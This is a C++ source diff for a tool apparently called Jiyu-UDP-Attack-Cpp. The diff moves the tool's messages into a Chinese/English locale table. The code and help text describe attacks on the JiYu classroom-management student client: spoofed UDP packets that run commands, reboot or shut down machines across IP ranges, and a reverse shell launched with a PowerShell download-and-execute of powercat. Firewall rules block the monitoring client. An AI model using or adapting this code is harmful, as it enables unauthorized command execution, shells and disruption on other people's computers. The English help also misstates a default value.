@@ -19,6 +19,327 @@
 #pragma comment(lib, "user32.lib")
 #endif // _MSC_VER
 
+namespace Locale {
+    enum LocaleEnum {
+        Simplified_Chinese,
+        American_English
+    };
+    enum PhraseEnum {
+        Language,
+        LoggerInited,
+        ISocketIniting,
+        FailExecWSAStartup,
+        FailStartSocketClient,
+        FailGetStudentListenIP,
+        FailGetIP,
+        ISocketInited,
+        FailExecGethostname,
+        FailExecGethostbyname,
+        FailFindStudentMain,
+        GetStudentMainCount,
+        FailGetUDPTable,
+        FailSendtoFault,
+        JiYuAttackInited,
+        IPParsed,
+        IPOrigin,
+        IPSegmentHyphen,
+        IPCClass,
+        IllegalIP,
+        ListeningNetcatPort,
+        RequireAdmin,
+        PackageInfo,
+        FailSend,
+        RoundFinish,
+        FinishSend,
+        PressingEscape,
+        GHRepo,
+        UIHeader,
+        WarningNoCMD,
+        UIHelp,
+        UIConfig,
+        NotSpecified,
+        InputCommand,
+        InputMessage,
+        InputIP,
+        InputPort,
+        InputNCPort,
+        InputLoopCount,
+        InputLoopInterval,
+        RequireIP,
+        FailConfigure,
+        SucceedConfigure,
+        FailNotNonNegative,
+        FailTooBig,
+        FailEmptyNum,
+        FailIllegalPort,
+        UIUnknownCommand,
+        InputExtraOption,
+        YourLocalIP,
+        StudentListenPort,
+        NotFound,
+        FailNoCMD,
+        GetOutScreenControl,
+        RecoverScreenControl,
+        FailNetcat,
+        DisconnectNetcat,
+        UIUnknownExtraOption,
+        CLIHelp,
+        FailIllegalNetcatPort,
+        FailArgumentFault,
+    };
+    const char* locales[2][61] = {
+        {
+            "简体中文",
+            "Logger 初始化完成。",
+            "正在初始化 ISocket……",
+            "执行 WSAStartup 失败。",
+            "Socket 客户端启动失败。",
+            "未能获取学生端监听端口对应的 IP，尝试使用其它本机 IP 代替……",
+            "未能获取合适的 IP。",
+            "ISocket 初始化完成。",
+            "执行 gethostname 失败。",
+            "执行 gethostbyname 失败。",
+            "进程 StudentMain.exe 未找到。返回空结果。",
+            "找到 %d 个学生端进程 ID……",
+            "获取 UDP 端口列表失败。错误码：%lu",
+            "发送失败。函数 sendto 出现问题。",
+            "JiYu_Attack 初始化完成。",
+            "IP 解析完成。类型：%s。",
+            "独立 IP",
+            "“-” 型 IP 段",
+            "C 类 IP 段",
+            "非法的 IP 地址格式。",
+            "正在监听 %d 端口的 netcat……\n",
+            "需要管理员权限。",
+            "正在向解析得到的 %d 个 IP 发送 %d 字节的数据包，原始 IP 为 %s……",
+            "发送失败。\n",
+            "第 %d 次发送完毕。\n",
+            "发送完毕。\n",
+            "尝试按下 ESC 键以停止 pause…… %d/%d",
+            "\
+------------------- GitHub Repository -------------------\n\
+    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\n%s",
+            "\
+Jiyu UDP Attack Cpp 用户界面\n\
+输入指令以继续。输入 help 以获取帮助。输入 exit 以退出。\n",
+            "警告：无法使用 CMD 命令行。某些功能可能无法使用。\n",
+            "\
+\n使用方法：\n\
+先配置信息，然后执行。信息会存储，可以反复使用。\n\n\
+用于退出的命令：\n\
+  exit\n\
+用于配置信息的命令：\n\
+  i(ip)     指定目标机的 IP。\n\
+  p         指定监听的端口。默认值为 4705。\n\
+  l         指定命令的循环次数。默认值为 1。\n\
+  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n\
+  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n\
+用于执行的命令：\n\
+  h(help) 显示帮助文本。\n\
+  config  显示当前的配置信息。\n\
+  m(msg)  发送信息。\n\
+  c       在目标机上运行指定命令。\n\
+  e       加载额外选项。\n\n\
+e 命令的额外选项：\n\
+  r        重启目标机。\n\
+  s        关闭目标机。\n\
+  g        获取当前的 IP 地址和学生端监听的端口。\n\
+  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n\
+  break    脱离屏幕控制。需要以管理员身份运行程序。\n\
+  continue 恢复屏幕控制。需要以管理员身份运行程序。\n",
+            "\
+指定的 IP 地址：%s\n\
+指定的监听端口：%d\n\
+指定的 netcat 监听端口：%d\n\
+指定的命令循环次数：%d\n\
+指定的两次循环之间的时间间隔，单位为秒：%d\n",
+            "未指定",
+            "输入指令内容：\n",
+            "输入消息内容：\n",
+            "输入目标机的 IP：",
+            "输入学生端的端口号：",
+            "输入 netcat 监听的端口号：",
+            "输入命令的循环次数：",
+            "输入两次循环之间的时间间隔，单位为秒：",
+            "缺少 IP 地址。\n",
+            "设置失败。\n",
+            "设置完成。\n",
+            "不是一个非负整数。设置失败。\n",
+            "数字过大。设置失败。\n",
+            "数字为空。设置失败。\n",
+            "非法的端口号。\n",
+            "未知的命令。请输入 help 以获取帮助。\n",
+            "输入额外选项：",
+            "你的本地 IP 地址：",
+            "\n学生端监听的端口：",
+            "未找到\n",
+            "无法使用 CMD 命令行，执行失败。\n",
+            "已退出屏幕控制。\n",
+            "已恢复屏幕控制。\n",
+            "\nNetcat 失败。\n",
+            "\n\
+Netcat 已断开连接。\n\
+如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n\
+如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n",
+            "未知的额外选项。请输入 help 以获取帮助。\n",
+            "\
+使用方法：\n\
+直接调用以唤起用户界面：\n\
+main\n\n\
+通过命令行调用：\n\
+main [-h(--help) |\n\
+  [-i(--i(--ip)) <IP>] [-p <Port>] [-m(--msg) <Message> | -c <Command>]\n\
+  [-l <Loop Count>] [-t <Loop Time Interval>]\n\
+  [-e <Extra Option>] [-n(--ncport) <NC Port>]]\n\n\
+参数列表：\n\
+  -h(--help)              显示帮助文本。\n\
+  -i(--ip) <IP>           指定目标机的 IP。\n\
+  -p <Port>               指定监听的端口。默认值为 4705。\n\
+  -m(--msg) <Message>     指定要发送的信息。\n\
+  -c <Command>            在目标机上运行指定命令。\n\
+  -e <Extra Option>       加载额外选项。\n\
+  -l <Loop Count>         指定命令的循环次数。默认值为 1。\n\
+  -t <Loop Time Interval> 指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n\
+  -n(--ncport) <NC Port>  指定 nc 命令的监听端口。默认值为 8888。\n\n\
+-e 参数的额外选项：\n\
+  r        重启目标机。\n\
+  s        关闭目标机。\n\
+  g        获取当前的 IP 地址和学生端监听的端口。\n\
+  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n\
+  break    脱离屏幕控制。需要以管理员身份运行程序。\n\
+  continue 恢复屏幕控制。需要以管理员身份运行程序。\n",
+            "非法的 netcat 端口号。\n",
+            "参数出现问题。请使用 -h 参数以获取帮助。\n",
+        },
+        {
+            "English (American)",
+            "Logger initialized.",
+            "Initializing ISocket...",
+            "Failed to execute WSAStartup.",
+            "Failed to start Socket Client.",
+            "Failed to get the IP listened by Student Terminal. Trying other local IPs...",
+            "Failed to get a proper IP.",
+            "ISocket initialized.",
+            "Failed to execute gethostname.",
+            "Failed to execute gethostbyname.",
+            "Process StudentMain.exe not found. Returning empty result.",
+            "Getting %d Student Terminal pid(s)...",
+            "Failed to get UDP port list. Error code: %lu",
+            "Failed to send. Something is wrong with sendto.",
+            "JiYu_Attack initialized.",
+            "IP parsed. Type: %s.",
+            "origin",
+            "'-' segment",
+            "C class",
+            "Illegal IP address format.",
+            "Listening netcat on port %d...\n",
+            "Access denied. Administrator required.",
+            "Sending data package with %d bytes to raw IP %s parsed into %d IPs...",
+            "Failed to send.\n",
+            "Round %d finished.\n",
+            "Finished sending.\n",
+            "Pressing escape to stop pausing... %d/%d",
+            "\
+------------------- GitHub Repository -------------------\n\
+    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\n%s",
+            "\
+Jiyu UDP Attack Cpp User Interface\n\
+Input command to continue. Input help for help. Input exit to exit.\n",
+            "Warning: CMD command line is not available. Some features may not work.\n",
+            "\
+\nUsage:\n\
+Configure the info, then execute the command. Info is stored and can be used repeatedly.\n\n\
+To exit execute:\n\
+  exit\n\n\
+Commands for configuration:\n\
+  i(ip)     Specify the IP of target.\n\
+  p         Specify which port to listen to. Default is 4705.\n\
+  l         Specify the loop count of the command. Default is 1.\n\
+  t         Specify the loop's interval time of the command, in seconds. Default is 4705.\n\
+  n(ncport) Specify which port for nc command to listen to. Default is 8888.\n\n\
+Commands for execution:\n\
+  h(help) Show help text.\n\
+  config  Show current configuration.\n\
+  m(msg)  Send messages.\n\
+  c       Run command on target machine.\n\
+  e       Load extra option.\n\n\
+Extra options of command 'e':\n\
+  r        Reboot the target machine.\n\
+  s        Shutdown the target machine.\n\
+  g        Get your current IP address and the port which Student Terminal listens to.\n\
+  nc       Reverse shell. Needs Internet access on target machine. Use command exit to exit.\n\
+  break    Get out of screen control. Needs administrator access.\n\
+  continue Recover screen control. Needs administrator access.\n",
+            "\
+Specified IP address: %s\n\
+Specified listening port: %d\n\
+Specified netcat listening port: %d\n\
+Specified command loop count: %d\n\
+Specified command loop interval time, in seconds: %d\n",
+            "Not specified",
+            "Input command:\n",
+            "Input message:\n",
+            "Input target IP:\n",
+            "Input listening port of Student Terminal:\n",
+            "Input netcat listening port:\n",
+            "Input command loop count:\n",
+            "Input command loop interval time, in seconds:\n",
+            "IP address is required.\n",
+            "Failed to configure.\n",
+            "Succeeded to configure.\n",
+            "Not a non-negative integer. Failed to configure.\n",
+            "Too big. Failed to configure.\n",
+            "Empty. Failed to configure.\n",
+            "Illegal port number.\n",
+            "Unknown command. Input help for help.\n",
+            "Input extra option:\n",
+            "Your local IP address(es):\n",
+            "\nStudent Terminal listening port:\n",
+            "Not found\n",
+            "Failed to execute. CMD command line is not available.\n",
+            "Got out of screen control.\n",
+            "Recovered screen control.\n",
+            "\nNetcat failed.\n",
+            "\nNetcat disconnected.\n\
+If no echo appears, it means the connection to target machine failed. Please check the IP address and Internet connectivity of target machine.\n\
+If 'could not resolve remote name', 'remote server returned error' appears, and Internet connectivity is fine, it means the link storing the script is invalid. Please contact GitHub@pbw-Kevin.\n",
+            "Unknown extra option. Input help for help.\n",
+            "\
+Usage:\n\
+Start UI by simply run the program or call:\
+main\n\n\
+Or, run on command line:\
+main [-h(--help) |\n\
+  [-i(--i(--ip)) <IP>] [-p <Port>] [-m(--msg) <Message> | -c <Command>]\n\
+  [-l <Loop Count>] [-t <Loop Time Interval>]\n\
+  [-e <Extra Option>] [-n(--ncport) <NC Port>]]\n\n\
+Arguments:\n\
+  -h(--help)              Show help text.\n\
+  -i(--ip) <IP>           Specify the IP of target.\n\
+  -p <Port>               Specify which port to listen to. Default is 4705.\n\
+  -m(--msg) <Message>     Specify the message to send.\n\
+  -c <Command>            Command to run on target machine.\n\
+  -e <Extra Option>       Load extra option.\n\
+  -l <Loop Count>         Specify the loop count of the command. Default is 1.\n\
+  -t <Loop Time Interval> Specify the loop's interval time of the command, in seconds. Default is 4705.\n\
+  -n(--ncport) <NC Port>  Specify which port for nc command to listen to. Default is 8888.\n\n\
+Available options for <Extra Option> of -e argument:\
+  r        Reboot the target machine.\n\
+  s        Shutdown the target machine.\n\
+  g        Get your current IP address and the port which Student Terminal listens to.\n\
+  nc       Reverse shell. Needs Internet access on target machine. Use command exit to exit.\n\
+  break    Get out of screen control. Needs administrator access.\n\
+  continue Recover screen control. Needs administrator access.\n",
+            "Illegal netcat port number.\n",
+            "Argument fault. Please use -h argument for help.\n",
+        },
+    };
+
+    const char** curLocale = locales[Simplified_Chinese];
+}
+
+using namespace Locale;
+
 class Logger {
     public:
         Logger(FILE* fp, int level = Warning);
@@ -30,6 +351,15 @@ class Logger {
             Error,
             Critical,
             None
+        };
+        const std::string logLevelStr[7] = {
+            "",
+            "DEBUG",
+            "INFO",
+            "WARNING",
+            "ERROR",
+            "CRITICAL",
+            "NONE",
         };
         static std::string getTime();
         void setLevel(int level);
@@ -127,7 +457,7 @@ DWORD WINAPI netcat_remote(LPVOID lpParameter);
 
 Logger::Logger(FILE* fp, int level) : fp(fp) {
     if(level >= Debug && level <= None) this->curLevel = level;
-    this->log(Info, "Logger initialized.");
+    this->log(Info, curLocale[LoggerInited]);
 };
 
 Logger::~Logger() {
@@ -153,13 +483,7 @@ void Logger::setLevel(int level) {
 template<typename... Args>
 void Logger::log(int level, std::string content, Args... args) {
     if(level < curLevel || level >= None) return;
-    std::string levelStr;
-    if(level == Debug) levelStr = "DEBUG";
-    else if(level == Info) levelStr = "INFO";
-    else if(level == Warning) levelStr = "WARNING";
-    else if(level == Error) levelStr = "ERROR";
-    else if(level == Critical) levelStr = "CRITICAL";
-    fprintf(fp, ("[" + getTime() + "|" + levelStr + "] " + content + "\n").c_str(), args...);
+    fprintf(fp, ("[" + getTime() + "|" + logLevelStr[level] + "] " + content + "\n").c_str(), args...);
 }
 
 int strToInt(std::string str) {
@@ -245,15 +569,15 @@ ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets) {
 }
 
 ISocket::ISocket(Logger* logger): logger(logger) {
-    logger->log(Logger::Info, "Initializing ISocket...");
+    logger->log(Logger::Info, curLocale[ISocketIniting]);
     if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
-        logger->log(Logger::Error, "执行 WSAStartup 失败。");
+        logger->log(Logger::Error, curLocale[FailExecWSAStartup]);
         return;
     }
 
     client = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if(client <= 0) {
-        logger->log(Logger::Error, "Socket 客户端启动失败。");
+        logger->log(Logger::Error, curLocale[FailStartSocketClient]);
         return;
     }
     setsockopt(client, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));
@@ -267,11 +591,11 @@ ISocket::ISocket(Logger* logger): logger(logger) {
         }
     }
     if(localIP == ""){
-        logger->log(Logger::Warning, "未能获取学生端监听端口对应的 IP，尝试使用其它本机 IP 代替……");
+        logger->log(Logger::Warning, curLocale[FailGetStudentListenIP]);
         if(localIPs.size()) localIP = localIPs[0];
-        else logger->log(Logger::Warning, "未能获取合适的 IP。");
+        else logger->log(Logger::Warning, curLocale[FailGetIP]);
     }
-    logger->log(Logger::Info, "ISocket initialized.");
+    logger->log(Logger::Info, curLocale[ISocketInited]);
 }
 
 ISocket::~ISocket() {
@@ -283,13 +607,13 @@ std::vector<std::string> ISocket::getLocalIPs() {
     std::vector<std::string> ret;
 
     if(gethostname(host, sizeof(host)) == SOCKET_ERROR) {
-        logger->log(Logger::Error, "执行 gethostname 失败。");
+        logger->log(Logger::Error, curLocale[FailExecGethostname]);
         return ret;
     }
 
     struct hostent *hp;
     if((hp = gethostbyname(host)) == NULL) {
-        logger->log(Logger::Error, "执行 gethostbyname 失败。");
+        logger->log(Logger::Error, curLocale[FailExecGethostbyname]);
         return ret;
     }
 
@@ -303,16 +627,16 @@ std::vector<StudentPort> ISocket::getStudentPorts() {
     std::vector<StudentPort> ret;
     auto studentMainPid = getProcessIdByName("StudentMain.exe");
     if(studentMainPid.empty()) {
-        logger->log(Logger::Warning, "进程 StudentMain.exe 未找到。返回空结果。");
+        logger->log(Logger::Warning, curLocale[FailFindStudentMain]);
         return ret;
     }
-    logger->log(Logger::Info, "Getting %d Student Terminal pid(s)...", (int)studentMainPid.size());
+    logger->log(Logger::Info, curLocale[GetStudentMainCount], (int)studentMainPid.size());
     DWORD dwBufferSize = 0;
     GetExtendedUdpTable(NULL, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
     MIB_UDPTABLE_OWNER_PID *pMibUdpTable = (MIB_UDPTABLE_OWNER_PID*)malloc(dwBufferSize);
     DWORD dwRet = GetExtendedUdpTable(pMibUdpTable, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
     if(dwRet != NO_ERROR) {
-        logger->log(Logger::Error, "获取 UDP 端口列表失败。错误码：%lu", dwRet);
+        logger->log(Logger::Error, curLocale[FailGetUDPTable], dwRet);
         return ret;
     }
     for(int i = 0; i < (int)pMibUdpTable->dwNumEntries; i++) {
@@ -340,7 +664,7 @@ int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
     int sendRes;
     sendRes = sendto(client, (const char*)&data[0], data.size(), 0, (sockaddr*)&dest_addr, sizeof(sockaddr));
     if(sendRes == -1) {
-        logger->log(Logger::Error, "发送失败。函数 sendto 出现问题。");
+        logger->log(Logger::Error, curLocale[FailSendtoFault]);
         return 1;
     }
     return 0;
@@ -349,7 +673,7 @@ int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
 JiYu_Attack::JiYu_Attack() {
     logger = new Logger(stdout, Logger::Error);
     client = new ISocket(logger);
-    logger->log(Logger::Info, "JiYu_Attack initialized.");
+    logger->log(Logger::Info, curLocale[JiYuAttackInited]);
 }
 
 const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
@@ -391,13 +715,13 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
     std::vector<std::string> ret;
     std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
-        logger->log(Logger::Info, "IP parsed. Type: origin.");
+        logger->log(Logger::Info, curLocale[IPParsed], curLocale[IPOrigin]);
         ret.push_back(rawIP);
         return ret;
     }
     pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
-        logger->log(Logger::Info, "IP parsed. Type: '-' segment.");
+        logger->log(Logger::Info, curLocale[IPParsed], curLocale[IPSegmentHyphen]);
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
         std::string rStr = rawIP.substr(rawIP.find('-') + 1);
@@ -409,14 +733,14 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
     }
     pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
     if(std::regex_match(rawIP, pattern)) {
-        logger->log(Logger::Info, "IP parsed. Type: class C.");
+        logger->log(Logger::Info, curLocale[IPParsed], curLocale[IPCClass]);
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         for(int i = 1; i < 255; i++) {
             ret.push_back(segPrefix + std::to_string(i));
         }
         return ret;
     }
-    logger->log(Logger::Error, "非法的 IP 地址格式。");
+    logger->log(Logger::Error, curLocale[IllegalIP]);
     return ret;
 }
 
@@ -468,7 +792,7 @@ int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
     }
     NetcatInfo ncInfo = {this, IP, port, ncport};
     HANDLE hThread = CreateThread(NULL, 0, netcat_remote, &ncInfo, 0, NULL);
-    printf("正在监听 %d 端口的 netcat……\n", ncport);
+    printf(curLocale[ListeningNetcatPort], ncport);
     system((
         "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
         "');powercat -l -p " + std::to_string(ncport)
@@ -480,7 +804,7 @@ int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
 
 int JiYu_Attack::breakScreenControl() {
     if(system("net session >nul 2>&1")) {
-        logger->log(Logger::Error, "需要管理员权限。");
+        logger->log(Logger::Error, curLocale[RequireAdmin]);
         return 3;
     }
     system("sc config MpsSvc start=auto >nul 2>&1");
@@ -488,16 +812,18 @@ int JiYu_Attack::breakScreenControl() {
     system("netsh advfirewall set allprofiles state on >nul 2>&1");
     system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
     system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=block >nul 2>&1");
+    printf(curLocale[GetOutScreenControl]);
     return 0;
 }
 
 int JiYu_Attack::continueScreenControl() {
     if(system("net session >nul 2>&1")) {
-        logger->log(Logger::Error, "需要管理员权限。");
+        logger->log(Logger::Error, curLocale[RequireAdmin]);
         return 3;
     }
     system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
     system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
+    printf(curLocale[RecoverScreenControl]);
     return 0;
 }
 
@@ -506,7 +832,7 @@ int JiYu_Attack::sendPkg(std::string rawIP, int port, std::vector<BYTE> data) {
     data.resize((std::max)((int)data.size(), 1024));
     auto IPs = IPParser(rawIP);
     if(IPs.empty()) return 4;
-    logger->log(Logger::Info, "Sending data package with %d bytes to raw IP %s parsed into %d IPs...", (int)data.size(), rawIP.c_str(), (int)IPs.size());
+    logger->log(Logger::Info, curLocale[PackageInfo], (int)data.size(), rawIP.c_str(), (int)IPs.size());
     int ret = 0;
     for(auto IP: IPs) {
         ret |= client->send(IP, port, data);
@@ -523,14 +849,14 @@ void loopSend(int loopCount, int loopInterval, JiYu_Attack *tmpJyAtk, int (JiYu_
     for(int i = 1; i <= loopCount; i++) {
         if(i > 1) Sleep(loopInterval * 1000);
         if((tmpJyAtk->*sendFunction)(args...)) {
-            printf("发送失败。\n");
+            printf(curLocale[FailSend]);
             return;
         }
         if(loopCount > 1) {
-            printf("第 %d 次发送完毕。\n", i);
+            printf(curLocale[RoundFinish], i);
         }
     }
-    printf("发送完毕。\n");
+    printf(curLocale[FinishSend]);
 }
 
 std::istream& getCleanedLine(std::string &str, bool clean = true) {
@@ -561,7 +887,7 @@ void pressEscape() {
     char pszNewWindowTitle[1024];
     char pszOldWindowTitle[1024];
     GetConsoleTitle(pszOldWindowTitle, 1024);
-    wsprintf(pszNewWindowTitle, "Pressing escape to stop pausing... %d/%d", GetTickCount(), GetCurrentProcessId());
+    wsprintf(pszNewWindowTitle, curLocale[PressingEscape], GetTickCount(), GetCurrentProcessId());
     SetConsoleTitle(pszNewWindowTitle);
     Sleep(100);
     hwnd = FindWindow(NULL, pszNewWindowTitle);
@@ -594,10 +920,10 @@ auto jyAtk = new JiYu_Attack;
 void startUI() {
     bool isCMDAvailable = checkCMDAvailability();
 
-    printf("------------------- GitHub Repository -------------------\n    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\nJiyu UDP Attack Cpp 用户界面\n输入指令以继续。输入 help 以获取帮助。输入 exit 以退出。\n");
+    printf(curLocale[GHRepo], curLocale[UIHeader]);
 
     if(!isCMDAvailable) {
-        printf("警告：无法使用 CMD 命令行。某些功能可能无法使用。\n");
+        printf(curLocale[WarningNoCMD]);
     }
 
     std::string opt, IP;
@@ -614,47 +940,44 @@ void startUI() {
             break;
         }
         else if(opt == "h" || opt == "help") {
-            printf("\n使用方法：\n先配置信息，然后执行。信息会存储，可以反复使用。\n\n用于退出的命令：\n  exit\n\n用于配置信息的命令：\n  i(ip)     指定目标机的 IP。\n  p         指定监听的端口。默认值为 4705。\n  l         指定命令的循环次数。默认值为 1。\n  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n用于执行的命令：\n  h(help) 显示帮助文本。\n  config  显示当前的配置信息。\n  m(msg)  发送信息。\n  c       在目标机上运行指定命令。\n  e       加载额外选项。\n\ne 命令的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
+            printf(curLocale[UIHelp]);
         }
         else if(opt  == "config") {
-            printf("指定的 IP 地址：%s\n", IP.size() ? IP.c_str() : "未指定");
-            printf("指定的监听端口：%d\n", port);
-            printf("指定的 netcat 监听端口：%d\n", ncport);
-            printf("指定的命令循环次数：%d\n", loopCount);
-            printf("指定的两次循环之间的时间间隔，单位为秒：%d\n", loopInterval);
+            printf(curLocale[UIConfig], IP.size() ? IP.c_str() : curLocale[NotSpecified], port, ncport, loopCount, loopInterval);
         }
         else if(opt == "m" || opt == "msg" || opt == "c") {
             if(IP == "") {
-                printf("缺少 IP。\n");
+                printf(curLocale[RequireIP]);
                 continue;
             }
-            printf(opt == "c" ? "输入指令内容：\n" : "输入消息内容：\n");
+            printf(curLocale[opt == "c" ? InputCommand : InputMessage]);
             getCleanedLine(tmpStr, false);
             loopSend(loopCount, loopInterval, jyAtk, opt == "c" ? &JiYu_Attack::sendCmd : &JiYu_Attack::sendMsg, IP, port, tmpStr);
         }
         else if(opt == "i" || opt == "ip") {
-            printf("输入目标机的 IP：");
+            printf(curLocale[InputIP]);
             getCleanedLine(tmpStr);
             if(jyAtk->IPParser(tmpStr).empty()) {
-                printf("设置失败。\n");
+                printf(curLocale[FailConfigure]);
             }
             else {
                 IP = tmpStr;
-                printf("设置完成。\n");
+                printf(curLocale[SucceedConfigure]);
             }
         }
         else if(opt == "p" || opt == "port" || opt == "n" || opt == "ncport" || opt == "l" || opt == "t") {
-            switch (opt[0]) {
-                case 'p': printf("输入学生端的端口号："); break;
-                case 'n': printf("输入 netcat 监听的端口号："); break;
-                case 'l': printf("输入命令的循环次数："); break;
-                case 't': printf("输入两次循环之间的时间间隔，单位为秒："); break;
-            }
+            printf(curLocale[
+                opt[0] == 'l' ? InputLoopCount : (
+                    opt[0] == 't' ? InputLoopInterval : (
+                        opt[0] == 'n' ? InputNCPort : InputPort
+                    )
+                )
+            ]);
             getCleanedLine(tmpStr);
             bool hasError = false;
             for(auto c: tmpStr) {
                 if(!isdigit(c)) {
-                    printf("不是一个非负整数。设置失败。\n");
+                    printf(curLocale[FailNotNonNegative]);
                     hasError = true;
                     break;
                 }
@@ -663,39 +986,39 @@ void startUI() {
                 continue;
             }
             if(tmpStr.size() > 9) {
-                printf("数字过大。设置失败。\n");
+                printf(curLocale[FailTooBig]);
                 continue;
             }
             if(tmpStr.empty()) {
-                printf("数字为空。设置失败。\n");
+                printf(curLocale[FailEmptyNum]);
                 continue;
             }
             int val = strToInt(tmpStr);
             if(opt == "l" || opt == "t") {
                 if(opt == "l")loopCount = val;
                 else loopInterval = val;
-                printf("设置完成。\n");
+                printf(curLocale[SucceedConfigure]);
                 continue;
             }
             if(!isValidPort(val)) {
-                printf("非法的端口号。设置失败。\n");
+                printf(curLocale[FailIllegalPort]);
                 continue;
             }
             if(opt == "p" || opt == "port") port = val;
             else if(opt == "n" || opt == "ncport") ncport = val;
-            printf("设置完成。\n");
+            printf(curLocale[SucceedConfigure]);
         }
         else if(opt != "e") {
-            printf("未知的命令。请输入 help 以获取帮助。\n");
+            printf(curLocale[UIUnknownCommand]);
             continue;
         }
         if(opt != "e") continue;
         std::string extraOpt;
-        printf("输入额外选项：");
+        printf(curLocale[InputExtraOption]);
         getCleanedLine(extraOpt);
         if(extraOpt == "g") {
             auto localIPs = jyAtk->client->getLocalIPs();
-            printf("你的本地 IP 地址：");
+            printf(curLocale[YourLocalIP]);
             if(localIPs.size()) {
                 putchar('\n');
                 for(auto i: localIPs) {
@@ -708,7 +1031,7 @@ void startUI() {
                         ports.push_back(port.port);
                     }
                 }
-                printf("\n学生端监听的端口：");
+                printf(curLocale[StudentListenPort]);
                 if(ports.size()) {
                     putchar('\n');
                     for(auto i: ports) {
@@ -716,47 +1039,44 @@ void startUI() {
                     }
                 }
                 else {
-                    printf("未找到\n");
+                    printf(curLocale[NotFound]);
                 }
             }
             else {
-                printf("未找到\n");
+                printf(curLocale[NotFound]);
             }
         }
         else if(extraOpt == "break" || extraOpt == "continue") {
             if(!isCMDAvailable) {
-                printf("无法使用 CMD 命令行，执行失败。\n");
+                printf(curLocale[FailNoCMD]);
             }
-            else if((extraOpt == "break" ? jyAtk->breakScreenControl() : jyAtk->continueScreenControl()) == 3) {
-                printf("需要管理员权限。\n");
-            }
-            else printf(extraOpt == "break" ? "已退出屏幕控制。\n" : "已恢复屏幕控制。\n");
+            (extraOpt == "break" ? jyAtk->breakScreenControl() : jyAtk->continueScreenControl());
         }
         else if(extraOpt == "r" || extraOpt == "s") {
             if(IP == "") {
-                printf("缺少 IP。\n");
+                printf(curLocale[RequireIP]);
                 continue;
             }
             loopSend(loopCount, loopInterval, jyAtk, extraOpt == "r" ? &JiYu_Attack::sendReboot : &JiYu_Attack::sendShutdown, IP, port);
         }
         else if(extraOpt == "nc") {
             if(!isCMDAvailable) {
-                printf("无法使用 CMD 命令行，执行失败。\n");
+                printf(curLocale[FailNoCMD]);
                 continue;
             }
             if(IP == "") {
-                printf("缺少 IP。\n");
+                printf(curLocale[RequireIP]);
                 continue;
             }
             if(jyAtk->netcat(IP, port, ncport)) {
-                printf("\nNetcat 失败。\n");
+                printf(curLocale[FailNetcat]);
             }
             else {
-                printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
+                printf(curLocale[DisconnectNetcat]);
             }
         }
         else {
-            printf("未知的额外选项。请输入 help 以获取帮助。\n");
+            printf(curLocale[UIUnknownExtraOption]);
         }
     }
     return;
@@ -780,14 +1100,14 @@ int main(int argc, char *argv[]) {
     };
     auto paramRets = GetParams(argc, argv, paramOpts);
     if(GetParamfromParams("help", paramRets).exists) {
